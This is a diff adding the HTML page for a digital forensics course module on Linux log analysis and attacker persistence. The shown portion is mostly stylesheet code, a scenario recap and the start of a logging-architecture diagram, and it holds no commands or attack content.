@@ -1,0 +1,1815 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 9.4 – Linux Log Analysis &amp; Attacker Persistence | CSC 156</title>
+<style>
+  /* ── DESIGN TOKENS ─────────────────────────────────────────── */
+  :root {
+    --clr-primary:       #1a3a5c;
+    --clr-primary-light: #2563a8;
+    --clr-accent:        #e07b2a;
+    --clr-accent-light:  #fdf0e0;
+    --clr-success:       #1a6b3c;
+    --clr-success-bg:    #eaf5ee;
+    --clr-error:         #8b1a1a;
+    --clr-error-bg:      #fdeaea;
+    --clr-info:          #1a4a6b;
+    --clr-info-bg:       #e6f0f8;
+    --clr-warn:          #7a4f00;
+    --clr-warn-bg:       #fff8e6;
+    --clr-surface:       #f7f9fc;
+    --clr-border:        #ccd6e0;
+    --clr-text:          #1a1a2e;
+    --clr-text-muted:    #4a5568;
+    --clr-white:         #ffffff;
+    --clr-code-bg:       #1e2a38;
+    --clr-code-text:     #a8d8a8;
+    --radius-sm:  4px;
+    --radius-md:  8px;
+    --radius-lg:  12px;
+    --shadow-sm:  0 1px 3px rgba(0,0,0,.12);
+    --shadow-md:  0 4px 12px rgba(0,0,0,.14);
+    --font-sans:  system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+    --font-mono:  "Fira Code", "Cascadia Code", Consolas, "Courier New", monospace;
+    --max-w:      860px;
+    --nav-h:      3.25rem;
+  }
+
+  /* ── RESET / BASE ───────────────────────────────────────────── */
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+  html { scroll-behavior: smooth; }
+  body {
+    font-family: var(--font-sans);
+    font-size: 1rem;
+    line-height: 1.7;
+    color: var(--clr-text);
+    background: var(--clr-surface);
+  }
+  h1,h2,h3,h4 { line-height: 1.3; color: var(--clr-primary); }
+  h2 { font-size: 1.55rem; margin-bottom: .5rem; }
+  h3 { font-size: 1.2rem;  margin-bottom: .4rem; }
+  h4 { font-size: 1rem;    margin-bottom: .3rem; }
+  p  { margin-bottom: .9rem; }
+  ul, ol { padding-left: 1.4rem; margin-bottom: .9rem; }
+  li { margin-bottom: .3rem; }
+  strong { color: var(--clr-primary); }
+  code {
+    font-family: var(--font-mono);
+    font-size: .88em;
+    background: #e8eef4;
+    padding: .1em .35em;
+    border-radius: var(--radius-sm);
+    color: #1a3a5c;
+  }
+  a { color: var(--clr-primary-light); }
+  a:focus-visible {
+    outline: 3px solid var(--clr-accent);
+    outline-offset: 3px;
+    border-radius: 2px;
+  }
+
+  /* ── SKIP LINK ──────────────────────────────────────────────── */
+  .skip-link {
+    position: absolute; top: -60px; left: 0;
+    background: var(--clr-accent); color: var(--clr-white);
+    padding: .5rem 1rem; font-weight: 700; z-index: 9999;
+    border-radius: 0 0 var(--radius-md) 0; transition: top .2s;
+  }
+  .skip-link:focus { top: 0; }
+
+  /* ── TOP NAV ────────────────────────────────────────────────── */
+  .top-nav {
+    background: var(--clr-primary);
+    position: sticky; top: 0; z-index: 100;
+    box-shadow: var(--shadow-md);
+  }
+  .top-nav__inner {
+    max-width: var(--max-w); margin: 0 auto; padding: 0 1rem;
+    display: flex; flex-wrap: wrap; align-items: center; gap: .25rem;
+  }
+  .top-nav__brand {
+    color: var(--clr-accent); font-weight: 700; font-size: .9rem;
+    padding: .6rem .5rem .6rem 0; margin-right: .5rem; white-space: nowrap;
+    border-right: 1px solid rgba(255,255,255,.2);
+  }
+  .top-nav__links {
+    display: flex; flex-wrap: wrap; list-style: none; padding: 0; margin: 0; gap: .1rem;
+  }
+  .top-nav__links a {
+    display: block; color: rgba(255,255,255,.88); text-decoration: none;
+    font-size: .82rem; font-weight: 700; padding: .55rem .7rem;
+    border-radius: var(--radius-sm); transition: background .15s, color .15s;
+    white-space: nowrap;
+  }
+  .top-nav__links a:hover { background: rgba(255,255,255,.12); color: var(--clr-white); }
+  .top-nav__links a:focus-visible { outline: 3px solid var(--clr-accent); outline-offset: 2px; }
+
+  /* ── PAGE HEADER ────────────────────────────────────────────── */
+  .page-header {
+    background: linear-gradient(135deg, var(--clr-primary) 0%, #0f2540 100%);
+    color: var(--clr-white); padding: 2.8rem 1.5rem 2.2rem;
+  }
+  .page-header__inner { max-width: var(--max-w); margin: 0 auto; }
+  .page-header__eyebrow {
+    font-size: .8rem; font-weight: 600; letter-spacing: .1em;
+    text-transform: uppercase; color: var(--clr-accent); margin-bottom: .5rem;
+  }
+  .page-header h1 { color: var(--clr-white); font-size: 1.9rem; margin-bottom: .6rem; }
+  .page-header__sub { font-size: 1rem; color: rgba(255,255,255,.78); max-width: 640px; margin-bottom: 1.2rem; }
+  .badge-row { display: flex; flex-wrap: wrap; gap: .5rem; }
+  .badge {
+    display: inline-flex; align-items: center; gap: .3rem;
+    font-size: .75rem; font-weight: 600; padding: .25rem .7rem;
+    border-radius: 999px; background: rgba(255,255,255,.12);
+    color: rgba(255,255,255,.9); border: 1px solid rgba(255,255,255,.2);
+  }
+  .badge--accent { background: var(--clr-accent); color: var(--clr-white); border-color: transparent; }
+
+  /* ── MAIN CONTENT ───────────────────────────────────────────── */
+  .main { max-width: var(--max-w); margin: 0 auto; padding: 2rem 1.25rem 3rem; }
+
+  /* ── SECTION WRAPPER ────────────────────────────────────────── */
+  .section { margin-bottom: 2.8rem; scroll-margin-top: var(--nav-h); }
+  .section-header {
+    display: flex; align-items: center; gap: .65rem;
+    margin-bottom: 1rem; padding-bottom: .5rem;
+    border-bottom: 3px solid var(--clr-primary-light);
+  }
+  .section-icon {
+    width: 2rem; height: 2rem; background: var(--clr-primary);
+    border-radius: var(--radius-md); display: flex; align-items: center;
+    justify-content: center; color: var(--clr-white); font-size: 1rem; flex-shrink: 0;
+  }
+
+  /* ── CALLOUT BOXES ──────────────────────────────────────────── */
+  .callout {
+    border-left: 4px solid; padding: .9rem 1.1rem;
+    border-radius: 0 var(--radius-md) var(--radius-md) 0; margin-bottom: 1rem;
+  }
+  .callout__label {
+    font-size: .72rem; font-weight: 700; letter-spacing: .09em;
+    text-transform: uppercase; margin-bottom: .3rem;
+  }
+  .callout--info  { background: var(--clr-info-bg);    border-color: var(--clr-info); }
+  .callout--info  .callout__label { color: var(--clr-info); }
+  .callout--info  p, .callout--info li { color: var(--clr-text); }
+  .callout--warn  { background: var(--clr-warn-bg);    border-color: #c07000; }
+  .callout--warn  .callout__label { color: var(--clr-warn); }
+  .callout--warn  p, .callout--warn li { color: var(--clr-text); }
+  .callout--success { background: var(--clr-success-bg); border-color: var(--clr-success); }
+  .callout--success .callout__label { color: var(--clr-success); }
+  .callout--success p, .callout--success li { color: var(--clr-text); }
+  .callout--danger { background: #fdeaea; border-color: #8b1a1a; border-left-width: 5px; }
+  .callout--danger .callout__label { color: #8b1a1a; }
+  .callout--danger p, .callout--danger li { color: var(--clr-text); }
+  .callout--scenario {
+    background: #f0f4ff; border-color: #3a5bbf; border-left-width: 5px;
+  }
+  .callout--scenario .callout__label { color: #3a5bbf; }
+  .callout--scenario p { color: var(--clr-text); }
+
+  /* ── SCENARIO CARD ──────────────────────────────────────────── */
+  .scenario-card {
+    background: linear-gradient(135deg, #1a2e4a 0%, #0f1e32 100%);
+    border-radius: var(--radius-lg); padding: 1.8rem; color: var(--clr-white);
+    margin-bottom: 1.5rem; box-shadow: var(--shadow-md);
+    position: relative; overflow: hidden;
+  }
+  .scenario-card::before {
+    content: ''; position: absolute; top: -30px; right: -30px;
+    width: 120px; height: 120px; background: rgba(224,123,42,.15); border-radius: 50%;
+  }
+  .scenario-card__label {
+    font-size: .72rem; font-weight: 700; letter-spacing: .1em;
+    text-transform: uppercase; color: var(--clr-accent); margin-bottom: .6rem;
+  }
+  .scenario-card h3 { color: var(--clr-white); font-size: 1.15rem; margin-bottom: .7rem; }
+  .scenario-card p { color: rgba(255,255,255,.85); margin-bottom: .6rem; }
+  .scenario-card p:last-child { margin-bottom: 0; }
+  .scenario-card strong { color: var(--clr-accent); }
+
+  /* ── ARCHITECTURE DIAGRAM ───────────────────────────────────── */
+  .arch-diagram {
+    background: var(--clr-code-bg); border-radius: var(--radius-lg);
+    padding: 1.4rem 1.6rem; margin: 1rem 0; overflow-x: auto;
+  }
+  .arch-diagram__title {
+    color: var(--clr-accent); font-size: .78rem; font-weight: 700;
+    letter-spacing: .1em; text-transform: uppercase; margin-bottom: 1rem;
+  }
+  .arch-row {
+    display: flex; align-items: stretch; gap: .6rem;
+    margin-bottom: .55rem; flex-wrap: wrap;
+  }
+  .arch-box {
+    border-radius: var(--radius-md); padding: .55rem .9rem;
+    font-family: var(--font-mono); font-size: .82rem; font-weight: 600;
+    display: flex; align-items: center; gap: .4rem; white-space: nowrap;
+  }
+  .arch-box--app    { background: #1e3a5a; color: #90e0ef; border: 1px solid #2a5a8a; }
+  .arch-box--daemon { background: #1a3a2a; color: #a8d8a8; border: 1px solid #2a6a3a; }
+  .arch-box--file   { background: #3a2a1a; color: #f9c74f; border: 1px solid #6a4a1a; }
+  .arch-box--kernel { background: #2a1a3a; color: #c9a0dc; border: 1px solid #5a3a6a; }
+  .arch-arrow {
+    color: rgba(255,255,255,.4); font-size: 1.1rem;
+    display: flex; align-items: center; flex-shrink: 0;
+  }
+  .arch-label {
+    color: rgba(255,255,255,.45); font-size: .72rem; font-style: italic;
+    display: flex; align-items: center; padding-left: .3rem;
+  }
+  .arch-divider {
+    border: none; border-top: 1px dashed rgba(255,255,255,.15); margin: .8rem 0;
+  }
+
+  /* ── COMPARISON TABLE ───────────────────────────────────────── */
+  .compare-table-wrap { overflow-x: auto; margin-bottom: 1.2rem; border-radius: var(--radius-md); box-shadow: var(--shadow-sm); }
+  .compare-table {
+    width: 100%; border-collapse: collapse; font-size: .91rem; background: var(--clr-white);
+  }
+  .compare-table thead tr { background: var(--clr-primary); color: var(--clr-white); }
+  .compare-table thead th {
+    padding: .75rem 1rem; text-align: left; font-weight: 600;
+    font-size: .85rem; letter-spacing: .04em;
+  }
+  .compare-table thead th:first-child { border-radius: var(--radius-md) 0 0 0; }
+  .compare-table thead th:last-child  { border-radius: 0 var(--radius-md) 0 0; }
+  .compare-table tbody tr { border-bottom: 1px solid var(--clr-border); }
+  .compare-table tbody tr:nth-child(even) { background: #f4f7fb; }
+  .compare-table tbody tr:hover { background: #eaf0f8; }
+  .compare-table td { padding: .65rem 1rem; vertical-align: top; }
+  .compare-table td:first-child {
+    font-weight: 600; color: var(--clr-text-muted); font-size: .82rem;
+    text-transform: uppercase; letter-spacing: .04em; white-space: nowrap;
+  }
+  .tag {
+    display: inline-block; font-size: .7rem; font-weight: 700;
+    padding: .1em .5em; border-radius: 999px; margin-left: .3rem; vertical-align: middle;
+  }
+  .tag--red    { background: #fde8e8; color: #8b1a1a; }
+  .tag--green  { background: #d4edda; color: #155724; }
+  .tag--amber  { background: #fff3cd; color: #7a4f00; }
+  .tag--blue   { background: #d1ecf1; color: #0c5460; }
+
+  /* ── ACCORDION ──────────────────────────────────────────────── */
+  .accordion { border: 1px solid var(--clr-border); border-radius: var(--radius-md); overflow: hidden; margin-bottom: .6rem; }
+  .accordion__trigger {
+    width: 100%; background: var(--clr-white); border: none;
+    padding: .85rem 1.1rem; text-align: left; cursor: pointer;
+    display: flex; align-items: center; gap: .7rem;
+    font-family: var(--font-sans); font-size: .95rem; font-weight: 600;
+    color: var(--clr-primary); transition: background .15s;
+  }
+  .accordion__trigger:hover { background: #eef3f9; }
+  .accordion__trigger:focus-visible { outline: 3px solid var(--clr-accent); outline-offset: -3px; }
+  .accordion__icon {
+    margin-left: auto; font-size: .8rem; transition: transform .25s;
+    color: var(--clr-text-muted); flex-shrink: 0;
+  }
+  .accordion__trigger[aria-expanded="true"] .accordion__icon { transform: rotate(180deg); }
+  .accordion__trigger[aria-expanded="true"] { background: #eef3f9; border-bottom: 1px solid var(--clr-border); }
+  .accordion__panel { display: none; padding: .9rem 1.1rem; background: var(--clr-white); font-size: .93rem; }
+  .accordion__panel.is-open { display: block; }
+
+  /* ── CODE BLOCK ─────────────────────────────────────────────── */
+  .code-block {
+    background: var(--clr-code-bg); color: var(--clr-code-text);
+    font-family: var(--font-mono); font-size: .83rem;
+    padding: 1rem 1.2rem; border-radius: var(--radius-md);
+    overflow-x: auto; margin: .7rem 0; line-height: 1.6;
+  }
+  .code-block .comment { color: #7a9ab8; font-style: italic; }
+  .code-block .flag    { color: #f9c74f; }
+  .code-block .path    { color: #90e0ef; }
+  .code-block .cmd     { color: #a8d8a8; }
+  .code-block .hi      { color: #ff9f7f; font-weight: 700; }
+  .code-block .dim     { color: rgba(168,216,168,.5); }
+
+  /* ── ANNOTATED LOG ──────────────────────────────────────────── */
+  .log-annotated {
+    background: var(--clr-code-bg); border-radius: var(--radius-lg);
+    padding: 1.2rem 1.4rem; margin: .8rem 0; overflow-x: auto;
+  }
+  .log-annotated__title {
+    color: var(--clr-accent); font-size: .75rem; font-weight: 700;
+    letter-spacing: .1em; text-transform: uppercase; margin-bottom: .9rem;
+  }
+  .log-line {
+    font-family: var(--font-mono); font-size: .8rem; line-height: 1.5;
+    margin-bottom: .2rem; display: flex; flex-wrap: wrap; gap: 0;
+  }
+  .log-field {
+    display: inline-block; padding: .1em .3em; border-radius: 3px; margin: .05em .1em;
+  }
+  .lf-ip      { background: #1e3a5a; color: #90e0ef; }
+  .lf-ident   { background: #2a2a2a; color: #888; }
+  .lf-time    { background: #2a3a1a; color: #b8e0a0; }
+  .lf-req     { background: #3a2a1a; color: #f9c74f; }
+  .lf-status  { background: #1a2a1a; color: #a8d8a8; }
+  .lf-status--err { background: #3a1a1a; color: #ff9f7f; }
+  .lf-bytes   { background: #1a1a2a; color: #c9a0dc; }
+  .lf-ref     { background: #2a2a1a; color: #d4c47a; }
+  .lf-ua      { background: #1a2a2a; color: #7adcd4; }
+  .log-ann {
+    display: flex; flex-direction: column; gap: .5rem; margin-top: .9rem;
+  }
+  .log-ann__item {
+    display: flex; gap: .7rem; align-items: flex-start; font-size: .82rem;
+  }
+  .log-ann__swatch {
+    width: .85rem; height: .85rem; border-radius: 3px; flex-shrink: 0; margin-top: .2rem;
+  }
+  .log-ann__text { color: rgba(255,255,255,.8); line-height: 1.5; }
+  .log-ann__text strong { color: rgba(255,255,255,.95); }
+
+  /* ── PERSISTENCE MAP ────────────────────────────────────────── */
+  .persist-map {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+    gap: .8rem; margin: 1rem 0;
+  }
+  .persist-card {
+    background: var(--clr-white); border: 2px solid var(--clr-border);
+    border-radius: var(--radius-md); padding: .9rem 1rem;
+    text-align: center; box-shadow: var(--shadow-sm);
+    transition: border-color .15s, box-shadow .15s;
+  }
+  .persist-card:hover { border-color: var(--clr-primary-light); box-shadow: var(--shadow-md); }
+  .persist-card__icon { font-size: 1.6rem; margin-bottom: .3rem; }
+  .persist-card__name { font-size: .82rem; font-weight: 700; color: var(--clr-primary); margin-bottom: .2rem; }
+  .persist-card__risk {
+    display: inline-block; font-size: .68rem; font-weight: 700;
+    padding: .1em .5em; border-radius: 999px; margin-top: .2rem;
+  }
+  .risk--critical { background: #fde8e8; color: #8b1a1a; }
+  .risk--high     { background: #fff3cd; color: #7a4f00; }
+  .risk--medium   { background: #d4edda; color: #155724; }
+
+  /* ── RED FLAG LIST ──────────────────────────────────────────── */
+  .redflag-list { list-style: none; padding: 0; margin-bottom: .9rem; }
+  .redflag-list li {
+    display: flex; align-items: flex-start; gap: .6rem;
+    padding: .5rem .7rem; border-radius: var(--radius-md);
+    margin-bottom: .4rem; background: #fff8f8;
+    border-left: 3px solid #c0392b; font-size: .9rem;
+  }
+  .redflag-list li::before {
+    content: '🚩'; flex-shrink: 0; margin-top: .05rem;
+  }
+
+  /* ── INTERACTIVE CRON ACTIVITY ──────────────────────────────── */
+  .activity-card {
+    background: linear-gradient(135deg, #1a2e4a 0%, #0f1e32 100%);
+    border-radius: var(--radius-lg); padding: 1.6rem;
+    margin-bottom: 1.5rem; box-shadow: var(--shadow-md);
+  }
+  .activity-card__label {
+    font-size: .72rem; font-weight: 700; letter-spacing: .1em;
+    text-transform: uppercase; color: var(--clr-accent); margin-bottom: .5rem;
+  }
+  .activity-card h3 { color: var(--clr-white); font-size: 1.1rem; margin-bottom: .8rem; }
+  .activity-card p  { color: rgba(255,255,255,.82); font-size: .92rem; margin-bottom: .6rem; }
+  .cron-entries { display: flex; flex-direction: column; gap: .5rem; margin: .8rem 0; }
+  .cron-entry {
+    background: rgba(255,255,255,.06); border: 1px solid rgba(255,255,255,.1);
+    border-radius: var(--radius-md); padding: .6rem .9rem;
+    font-family: var(--font-mono); font-size: .8rem; color: #a8d8a8;
+    cursor: pointer; transition: background .15s, border-color .15s;
+    display: flex; align-items: center; justify-content: space-between; gap: .5rem;
+    flex-wrap: wrap;
+  }
+  .cron-entry:hover { background: rgba(255,255,255,.1); }
+  .cron-entry:focus-visible { outline: 3px solid var(--clr-accent); outline-offset: 2px; }
+  .cron-entry__flag-btn {
+    background: rgba(224,123,42,.2); border: 1px solid rgba(224,123,42,.4);
+    color: var(--clr-accent); font-size: .72rem; font-weight: 700;
+    padding: .2em .6em; border-radius: 999px; cursor: pointer;
+    font-family: var(--font-sans); transition: background .15s;
+    white-space: nowrap;
+  }
+  .cron-entry__flag-btn:hover { background: rgba(224,123,42,.35); }
+  .cron-entry__flag-btn:focus-visible { outline: 3px solid var(--clr-accent); outline-offset: 2px; }
+  .cron-entry.is-flagged {
+    background: rgba(139,26,26,.25); border-color: rgba(200,50,50,.5);
+    color: #ff9f9f;
+  }
+  .cron-entry.is-flagged .cron-entry__flag-btn {
+    background: rgba(139,26,26,.4); border-color: rgba(200,50,50,.6);
+    color: #ff9f9f;
+  }
+  .cron-entry.is-benign {
+    background: rgba(26,107,60,.2); border-color: rgba(50,150,80,.4);
+    color: #a8d8a8;
+  }
+  .activity-check-btn {
+    background: var(--clr-accent); color: var(--clr-white);
+    border: none; padding: .6rem 1.4rem; border-radius: var(--radius-md);
+    font-size: .92rem; font-weight: 700; cursor: pointer;
+    font-family: var(--font-sans); transition: background .15s; margin-top: .5rem;
+  }
+  .activity-check-btn:hover { background: #c96a1a; }
+  .activity-check-btn:focus-visible { outline: 3px solid var(--clr-white); outline-offset: 3px; }
+  .activity-result {
+    display: none; margin-top: 1rem; padding: .9rem 1.1rem;
+    border-radius: var(--radius-md); font-size: .9rem; line-height: 1.6;
+  }
+  .activity-result.show { display: block; }
+  .activity-result--good { background: rgba(26,107,60,.25); border-left: 4px solid #a8d8a8; color: rgba(255,255,255,.9); }
+  .activity-result--partial { background: rgba(122,79,0,.3); border-left: 4px solid #f9c74f; color: rgba(255,255,255,.9); }
+  .activity-result--miss { background: rgba(139,26,26,.3); border-left: 4px solid #ff9f7f; color: rgba(255,255,255,.9); }
+
+  /* ── KNOWLEDGE CHECK ────────────────────────────────────────── */
+  .kc-section {
+    background: var(--clr-white); border: 2px solid var(--clr-primary-light);
+    border-radius: var(--radius-lg); padding: 1.6rem; box-shadow: var(--shadow-sm);
+  }
+  .kc-header { display: flex; align-items: center; gap: .6rem; margin-bottom: 1.2rem; }
+  .kc-header__icon {
+    width: 2.2rem; height: 2.2rem; background: var(--clr-primary);
+    border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    color: var(--clr-white); font-size: 1rem; flex-shrink: 0;
+  }
+  .kc-header h2 { border-bottom: none; padding-bottom: 0; margin-bottom: 0; font-size: 1.3rem; }
+  .kc-question { margin-bottom: 1.6rem; }
+  .kc-question__stem { font-weight: 600; margin-bottom: .75rem; font-size: .97rem; }
+  .kc-question__num {
+    display: inline-flex; align-items: center; justify-content: center;
+    width: 1.6rem; height: 1.6rem; background: var(--clr-primary);
+    color: var(--clr-white); border-radius: 50%; font-size: .75rem;
+    font-weight: 700; margin-right: .5rem; flex-shrink: 0; vertical-align: middle;
+  }
+  .kc-options { list-style: none; padding: 0; }
+  .kc-options li { margin-bottom: .45rem; }
+  .kc-options label {
+    display: flex; align-items: flex-start; gap: .6rem; cursor: pointer;
+    padding: .55rem .8rem; border-radius: var(--radius-md);
+    border: 1px solid var(--clr-border); background: var(--clr-surface);
+    font-size: .93rem; transition: background .15s, border-color .15s;
+  }
+  .kc-options label:hover { background: #eef3f9; border-color: var(--clr-primary-light); }
+  .kc-options input[type="radio"] { margin-top: .2rem; accent-color: var(--clr-primary-light); flex-shrink: 0; }
+  .kc-btn {
+    background: var(--clr-primary); color: var(--clr-white); border: none;
+    padding: .55rem 1.3rem; border-radius: var(--radius-md); font-size: .9rem;
+    font-weight: 600; cursor: pointer; font-family: var(--font-sans);
+    transition: background .15s; margin-top: .4rem;
+  }
+  .kc-btn:hover { background: var(--clr-primary-light); }
+  .kc-btn:focus-visible { outline: 3px solid var(--clr-accent); outline-offset: 3px; }
+  .kc-feedback {
+    display: none; margin-top: .8rem; padding: .8rem 1rem;
+    border-radius: var(--radius-md); font-size: .91rem; line-height: 1.6;
+  }
+  .kc-feedback.show { display: block; }
+  .kc-feedback--correct { background: var(--clr-success-bg); border-left: 4px solid var(--clr-success); }
+  .kc-feedback--incorrect { background: var(--clr-error-bg); border-left: 4px solid var(--clr-error); }
+  .kc-feedback__verdict { font-weight: 700; margin-bottom: .3rem; }
+  .kc-feedback--correct  .kc-feedback__verdict { color: var(--clr-success); }
+  .kc-feedback--incorrect .kc-feedback__verdict { color: var(--clr-error); }
+
+  /* ── MODULE PROGRESS ────────────────────────────────────────── */
+  .module-progress {
+    background: var(--clr-white); border: 1px solid var(--clr-border);
+    border-radius: var(--radius-md); padding: .8rem 1.1rem; margin-bottom: 2rem;
+    display: flex; align-items: center; gap: .8rem; flex-wrap: wrap; font-size: .82rem;
+  }
+  .module-progress__label { font-weight: 600; color: var(--clr-text-muted); white-space: nowrap; }
+  .module-dots { display: flex; gap: .4rem; }
+  .module-dot {
+    width: .85rem; height: .85rem; border-radius: 50%;
+    border: 2px solid var(--clr-border); background: var(--clr-surface); position: relative;
+  }
+  .module-dot--done { background: var(--clr-primary-light); border-color: var(--clr-primary-light); }
+  .module-dot--current { background: var(--clr-primary); border-color: var(--clr-primary); }
+  .module-dot--current::after {
+    content: ''; position: absolute; inset: -4px;
+    border-radius: 50%; border: 2px solid var(--clr-primary-light);
+  }
+  .module-dot__tooltip {
+    position: absolute; bottom: calc(100% + 6px); left: 50%;
+    transform: translateX(-50%); background: var(--clr-primary);
+    color: var(--clr-white); font-size: .7rem; padding: .2em .5em;
+    border-radius: var(--radius-sm); white-space: nowrap;
+    pointer-events: none; opacity: 0; transition: opacity .15s;
+  }
+  .module-dot:hover .module-dot__tooltip { opacity: 1; }
+  .module-progress__note { color: var(--clr-text-muted); font-style: italic; }
+
+  /* ── FOOTER ─────────────────────────────────────────────────── */
+  .page-footer {
+    background: var(--clr-primary); color: rgba(255,255,255,.7);
+    text-align: center; padding: 1.2rem; font-size: .8rem; margin-top: 2rem;
+  }
+  .page-footer strong { color: var(--clr-accent); }
+
+  /* ── UTILITY ────────────────────────────────────────────────── */
+  .visually-hidden {
+    position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+    overflow: hidden; clip: rect(0,0,0,0); white-space: nowrap; border: 0;
+  }
+  .mt-sm { margin-top: .5rem; }
+  .mt-md { margin-top: 1rem; }
+  .divider { border: none; border-top: 1px solid var(--clr-border); margin: 1.5rem 0; }
+  .two-col {
+    display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1rem;
+  }
+  @media (max-width: 580px) {
+    .two-col { grid-template-columns: 1fr; }
+    .page-header h1 { font-size: 1.45rem; }
+    h2 { font-size: 1.3rem; }
+    .compare-table { font-size: .82rem; }
+    .persist-map { grid-template-columns: repeat(2, 1fr); }
+  }
+</style>
+</head>
+<body>
+
+<!-- SKIP LINK -->
+<a class="skip-link" href="#main-content">Skip to main content</a>
+
+<!-- TOP NAV -->
+<nav class="top-nav" aria-label="Module section navigation">
+  <div class="top-nav__inner">
+    <div class="top-nav__brand">CSC 156 · Mod 9.4</div>
+    <ul class="top-nav__links">
+      <li><a href="#logging-ecosystem" title="The Linux Logging Ecosystem">1 · Logging</a></li>
+      <li><a href="#log-files-ref"      title="Key Log Files Reference">2 · Log Files</a></li>
+      <li><a href="#web-log-analysis"   title="Web Server Log Analysis">3 · Web Logs</a></li>
+      <li><a href="#log-tampering"      title="Log Tampering Detection">4 · Tampering</a></li>
+      <li><a href="#persistence"        title="Linux Persistence Mechanisms">5 · Persistence</a></li>
+      <li><a href="#knowledge-check"    title="Knowledge Check">6 · Check</a></li>
+    </ul>
+  </div>
+</nav>
+
+<!-- PAGE HEADER -->
+<header class="page-header" role="banner">
+  <div class="page-header__inner">
+    <p class="page-header__eyebrow">Week 9 · Module 9.4 · Day 3–4</p>
+    <h1>The Full Picture: Linux Log Analysis &amp; Attacker Persistence</h1>
+    <p class="page-header__sub">Logging architecture, web server log forensics, log tampering detection, and a comprehensive survey of Linux attacker persistence mechanisms.</p>
+    <div class="badge-row">
+      <span class="badge badge--accent">▶ Day 3–4 Content</span>
+      <span class="badge">📋 Concepts &amp; Analysis</span>
+      <span class="badge">🧩 Interactive Activity</span>
+      <span class="badge">✅ Ungraded Knowledge Check</span>
+      <span class="badge">⏱ ~60–75 min</span>
+    </div>
+  </div>
+</header>
+
+<!-- MAIN -->
+<main id="main-content" class="main">
+
+  <!-- MODULE PROGRESS STRIP -->
+  <div class="module-progress" role="region" aria-label="Week 9 module progress">
+    <span class="module-progress__label">Week 9 Modules:</span>
+    <div class="module-dots" aria-label="5 modules; currently on module 4">
+      <div class="module-dot module-dot--done" role="img" aria-label="Module 9.1 – completed">
+        <span class="module-dot__tooltip">9.1 – Orientation</span>
+      </div>
+      <div class="module-dot module-dot--done" role="img" aria-label="Module 9.2 – completed">
+        <span class="module-dot__tooltip">9.2 – User Artifacts</span>
+      </div>
+      <div class="module-dot module-dot--done" role="img" aria-label="Module 9.3 – completed">
+        <span class="module-dot__tooltip">9.3 – Process &amp; Network</span>
+      </div>
+      <div class="module-dot module-dot--current" role="img" aria-label="Module 9.4 – current">
+        <span class="module-dot__tooltip">9.4 – Logs &amp; Persistence</span>
+      </div>
+      <div class="module-dot" role="img" aria-label="Module 9.5 – upcoming">
+        <span class="module-dot__tooltip">9.5 – Triage Lab</span>
+      </div>
+    </div>
+    <span class="module-progress__note">You are on Module 9.4 — the final Linux concepts module before the triage lab.</span>
+  </div>
+
+  <!-- SCENARIO RECAP -->
+  <section class="section" aria-labelledby="scenario-recap-heading">
+    <div class="scenario-card" role="region" aria-label="Week 9 scenario recap">
+      <p class="scenario-card__label">📋 Scenario — web-prod-03 (Ongoing)</p>
+      <h3 id="scenario-recap-heading">The logs and the persistence trail — your two best allies.</h3>
+      <p>You have already examined the directory hierarchy, user accounts, shell history, and SSH keys on the <strong>web-prod-03</strong> forensic image. Now you turn to the two richest evidence sources remaining: the <strong>logging ecosystem</strong> and the system's <strong>persistence configuration</strong>. Logs tell you <em>what happened and when</em>. Persistence mechanisms tell you <em>how the attacker planned to come back</em>.</p>
+      <p>This module gives you the conceptual tools to read both of those stories — including how to detect when an attacker has tried to erase them.</p>
+    </div>
+  </section>
+
+  <!-- ═══════════════════════════════════════════════════════════
+       SECTION 1 — THE LINUX LOGGING ECOSYSTEM
+  ════════════════════════════════════════════════════════════ -->
+  <section class="section" id="logging-ecosystem" aria-labelledby="logging-heading">
+    <div class="section-header">
+      <div class="section-icon" aria-hidden="true">📡</div>
+      <h2 id="logging-heading">1 · The Linux Logging Ecosystem</h2>
+    </div>
+
+    <p>Linux logging has evolved through three generations of technology that often coexist on the same system. Understanding the architecture tells you <em>where</em> logs live, <em>what format</em> they use, and critically — <em>what gaps an attacker could exploit or create</em>.</p>
+
+    <!-- Architecture diagram -->
+    <div class="arch-diagram" role="img" aria-label="Linux logging architecture diagram showing application layer, daemon layer, and storage layer">
+      <p class="arch-diagram__title">Linux Logging Architecture — Three-Layer View</p>
+
+      <p style="color:rgba(255,255,255,.5); font-size:.75rem; margin-bottom:.8rem;">LAYER 1 — EVENT SOURCES</p>
+      <div class="arch-row">
+        <div class="arch-box arch-box--app">🌐 Web App (Apache/Nginx)</div>
+        <div class="arch-box arch-box--app">🔐 sshd / PAM</div>
+        <div class="arch-box arch-box--app">⚙️ systemd services</div>
+        <div class="arch-box arch-box--app">🐧 Kernel (dmesg)</div>
+      </div>
+      <div class="arch-row">
+        <div class="arch-arrow" aria-hidden="true">↓</div>
+        <div class="arch-label">write via syslog() call or stdout/stderr to journald socket</div>
+      </div>
+
+      <hr class="arch-divider">
+      <p style="color:rgba(255,255,255,.5); font-size:.75rem; margin-bottom:.8rem;">LAYER 2 — LOG DAEMONS</p>
+      <div class="arch-row">
+        <div class="arch-box arch-box--daemon">journald<br><span style="font-size:.72rem;font-weight:400;color:rgba(168,216,168,.7)">systemd-journald</span></div>
+        <div class="arch-arrow" aria-hidden="true">⇄</div>
+        <div class="arch-box arch-box--daemon">rsyslog / syslog-ng<br><span style="font-size:.72rem;font-weight:400;color:rgba(168,216,168,.7)">traditional text forwarder</span></div>
+      </div>
+      <div class="arch-row" style="margin-top:.3rem;">
+        <div class="arch-arrow" aria-hidden="true">↓</div>
+        <div class="arch-label">journald can forward to rsyslog; rsyslog writes plain-text files</div>
+      </div>
+
+      <hr class="arch-divider">
+      <p style="color:rgba(255,255,255,.5); font-size:.75rem; margin-bottom:.8rem;">LAYER 3 — STORAGE</p>
+      <div class="arch-row">
+        <div class="arch-box arch-box--file">/run/log/journal/<br><span style="font-size:.72rem;font-weight:400;color:rgba(249,199,79,.7)">binary journal (volatile or persistent)</span></div>
